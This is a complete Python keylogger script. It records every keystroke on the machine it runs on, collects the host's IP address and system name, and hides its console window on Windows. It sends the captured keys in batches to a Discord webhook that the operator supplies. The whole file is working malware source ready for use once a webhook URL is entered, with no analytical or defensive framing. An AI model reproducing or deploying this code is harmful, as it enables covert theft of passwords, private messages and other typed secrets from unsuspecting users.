import keyboard
import requests
import json
import threading
import time
import os
import sys
import socket
import platform
from datetime import datetime

class DiscordKeylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.keys_buffer = []
        self.running = False
        self.user_ip = self.get_ip()
        self.computer_name = self.get_computer_info()
        self.start_time = datetime.now()
        
    def get_ip(self):
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "Unknown"
    
    def get_computer_info(self):
        try:
            return f"{platform.node()} ({platform.system()} {platform.release()})"
        except:
            return "Unknown"
    
    def on_key_press(self, event):
        key = event.name
        if len(key) > 1:
            key = f"[{key.upper()}]"
        self.keys_buffer.append(key)
        
        if len(self.keys_buffer) >= 50:
            self.send_to_discord()
    
    def create_embed(self, keys_data):
        keys_text = ''.join(keys_data)
        if len(keys_text) > 1000:
            keys_text = keys_text[:1000] + "..."
        
        runtime = datetime.now() - self.start_time
        hours, remainder = divmod(runtime.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        runtime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        embed = {
            "title": "🔑 Keylogger Active",
            "color": 0xFF0000,
            "fields": [
                {
                    "name": "Keystrokes",
                    "value": f"```\n{keys_text}\n```",
                    "inline": False
                },
                {
                    "name": "Total Keys",
                    "value": str(len(keys_data)),
                    "inline": True
                },
                {
                    "name": "User IP",
                    "value": self.user_ip,
                    "inline": True
                },
                {
                    "name": "Computer",
                    "value": self.computer_name,
                    "inline": True
                },
                {
                    "name": "Runtime",
                    "value": runtime_str,
                    "inline": True
                },
                {
                    "name": "Time",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Keylogger Session"
            },
            "timestamp": datetime.utcnow().isoformat()
        }
        
        return embed
    
    def send_to_discord(self):
        if not self.keys_buffer:
            return
        
        keys_to_send = self.keys_buffer.copy()
        self.keys_buffer = []
        
        embed = self.create_embed(keys_to_send)
        
        payload = {
            "embeds": [embed],
            "username": "Keylogger Bot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2881/2881142.png"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            self.keys_buffer = keys_to_send + self.keys_buffer
    
    def send_loop(self):
        while self.running:
            time.sleep(30)
            if self.keys_buffer:
                self.send_to_discord()
    
    def hide_console(self):
        if os.name == 'nt':
            import win32console
            import win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
    
    def start(self):
        self.hide_console()
        self.running = True
        
        startup_embed = {
            "title": "🚀 Keylogger Started",
            "color": 0x00FF00,
            "fields": [
                {
                    "name": "Computer",
                    "value": self.computer_name,
                    "inline": True
                },
                {
                    "name": "IP Address",
                    "value": self.user_ip,
                    "inline": True
                },
                {
                    "name": "Start Time",
                    "value": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Keylogger Session Started"
            }
        }
        
        startup_payload = {
            "embeds": [startup_embed],
            "username": "Keylogger Bot"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(startup_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            pass
        
        keyboard.on_press(self.on_key_press)
        send_thread = threading.Thread(target=self.send_loop, daemon=True)
        send_thread.start()
        
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        if self.keys_buffer:
            self.send_to_discord()
        
        shutdown_embed = {
            "title": "🛑 Keylogger Stopped",
            "color": 0xFF0000,
            "fields": [
                {
                    "name": "Total Runtime",
                    "value": str(datetime.now() - self.start_time),
                    "inline": True
                }
            ]
        }
        
        shutdown_payload = {
            "embeds": [shutdown_embed],
            "username": "Keylogger Bot"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(shutdown_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            pass
        
        keyboard.unhook_all()

def main():
    WEBHOOK_URL = "....." # Enter Your Webhook Link
    keylogger = DiscordKeylogger(webhook_url=WEBHOOK_URL)
    keylogger.start()

if __name__ == "__main__":
    main()
